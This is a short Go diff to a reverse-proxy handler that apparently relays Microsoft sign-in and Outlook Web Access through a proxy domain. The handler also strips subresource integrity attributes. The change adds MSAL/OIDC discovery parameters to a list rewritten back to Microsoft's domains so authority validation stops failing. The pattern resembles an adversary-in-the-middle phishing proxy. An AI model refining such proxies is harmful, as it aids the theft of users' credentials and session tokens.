@@ -1394,6 +1394,11 @@ func (m *ProxyHandler) stripSRIAttributes(body []byte) []byte {
 // parameters (redirect_uri, scope, resource, post_logout_redirect_uri, etc.).
 // These parameters are validated server-side by identity providers (e.g., Microsoft)
 // and must contain the original domain, not the proxy domain.
+//
+// Also handles MSAL/OIDC discovery parameters (authorization_endpoint, token_endpoint,
+// end_session_endpoint, issuer) which are sent by MSAL.js to login.microsoftonline.com
+// for authority validation. Without restoring these, the discovery/instance API rejects
+// the proxy domain as an unknown authority, causing OWA startupdata 401 errors.
 func (m *ProxyHandler) restoreOAuthParams(body []byte, config map[string]service.ProxyServiceDomainConfig) []byte {
 	// OAuth-sensitive parameter names that must contain original domains
 	oauthParams := []string{
@@ -1410,6 +1415,12 @@ func (m *ProxyHandler) restoreOAuthParams(body []byte, config map[string]service
 		"return",
 		"sru",
 		"lmtru",
+		// MSAL/OIDC discovery parameters - used by MSAL.js for authority validation
+		// against login.microsoftonline.com/common/discovery/instance
+		"authorization_endpoint",
+		"end_session_endpoint",
+		"token_endpoint",
+		"issuer",
 	}
 
 	// Build reverse mapping: proxy domain -> original domain
